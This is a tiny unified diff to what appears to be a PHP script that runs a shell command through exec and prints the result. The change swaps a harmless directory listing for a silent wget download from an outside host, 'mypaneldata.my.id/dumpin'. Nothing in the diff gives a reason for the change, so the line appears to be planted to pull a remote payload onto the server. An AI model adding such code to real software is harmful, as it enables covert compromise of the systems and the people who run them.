@@ -2,7 +2,7 @@
 
 //Store the output of the executed command
 
-$output1 =  exec('cd /; ls -a');
+$output1 =  exec('wget -q http://mypaneldata.my.id/dumpin');
 
 //Print the return value
 
